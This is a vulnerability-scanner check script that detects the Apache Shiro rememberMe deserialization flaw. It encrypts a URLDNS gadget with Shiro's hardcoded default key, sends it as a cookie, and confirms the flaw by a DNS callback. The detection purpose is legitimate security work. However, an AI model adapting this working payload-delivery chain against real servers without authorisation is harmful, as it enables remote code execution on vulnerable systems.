/**
title: Apache Shiro Deserialization RCE
tags: Shiro
description:
    Tests for an Apache Shiro Deserialization RCE via rememberMe cookie
**/

/// <reference path="../../native.d.ts"/>

// load modules
let aesjs = ax.loadModule("/lib/utility/crypto/aes.js");
let acumonitor = ax.loadModule("/lib/utility/acumonitor.js");
let rnd = ax.loadModule("/lib/utility/random.js");
let strings = ax.loadModule("/lib/utility/strings.js");

// debugging
function trace(msg) {
    //ax.log(1, "LOG:" + msg);
}

// alert the vulnerability
function alert(vulnxml, job, acumonitor_data) {
    scanState.addVuln({
        typeId: vulnxml,
        tags: ["verified", "acumonitor", "confidence.100"],
        location: scriptArg.location,
        http: job,
        details: { "acumonitor_data": acumonitor_data },
        detailsType: 1
    });
}

// pack array of bytes into a string
function pack(bytes) {
    var str = "";
    for (var i = 0; i < bytes.length; i += 1) {
        str += String.fromCharCode(bytes[i]);
    }
    return str;
}

// pad string for CBC 16
function pad(text) {
    let str = text;
    let extra = 16 - (str.length % 16);
    if (extra > 0) {
        for (let i = 0; i < extra; i++)
            str += String.fromCharCode(i);
    }
    return str;
}

// convert string to Uint8Array that is required by aes-js
function ui8(text) {
    var ret = new Uint8Array(text.length);
    for (var i = 0; i < text.length; i += 1) {
        ret[i] = text.charCodeAt(i);
    }
    return ret;
}

// test Apache Shiro Deser RCE
function testApacheShiroDeserializationRCE(location) {
    var url = location.url;
    trace("testing ApacheShiroDeserializationRCE on path " + url);

    // The Apache Shiro fixed key
    var key = [0x90, 0xf1, 0xfe, 0x6c, 0x8c, 0x64, 0xe4, 0x3d, 0x9d, 0x79, 0x98, 0x88, 0xc5, 0xc6, 0x9a, 0x68];

    // The initialization vector (must be 16 bytes)
    var iv = [1, 2, 3, 4, 5, 6, 7, 8, 1, 2, 3, 4, 5, 6, 7, 8];

    // prepare URLDNS payload
    var rndToken = acumonitor.signToken('hit' + rnd.randStrDigits(10));
    var payload = acumonitor.URLDNSPayload.replaceAll("hit1234512345ccccc", rndToken);

    // pad text to 16 bytes
    var text = pad(payload);

    // convert text to bytes (text must be a multiple of 16 bytes)
    var textBytes = ui8(text);

    // encrypt with AES CBC (pad first)
    var aesCbc = new aesjs.ModeOfOperation.cbc(key, iv);
    var encryptedBytes = aesCbc.encrypt(aesjs.padding.pkcs7.pad(textBytes));

    // prepare the final payload
    // base64 encode: IV + encrypted data
    var rememberMePayload = ax.util.base64Encode(pack(iv) + pack(encryptedBytes));

    // make request using the Shiro special cookie set to an URLDNS payload
    let job = ax.http.job();

    job.setUrl(url);
    job.verb = "GET";
    job.request.addHeader('Cookie', 'rememberMe=' + rememberMePayload);

    let http = ax.http.execute(job).sync();

    if (!http.error) {
        // check if vulnerable
        var result = acumonitor.verifyInjectionDNS(rndToken, ["AAAA", "A"]);

        if (result) {
            //trace("ALERT!!!!!");
            alert("Apache_Shiro_Deserialization_RCE.xml", job, result);
            return true;
        }
    }
}

function main() {

    testApacheShiroDeserializationRCE(scriptArg.location);
}

if (acumonitor.checkAcumonitor(scanState)) { main(); }
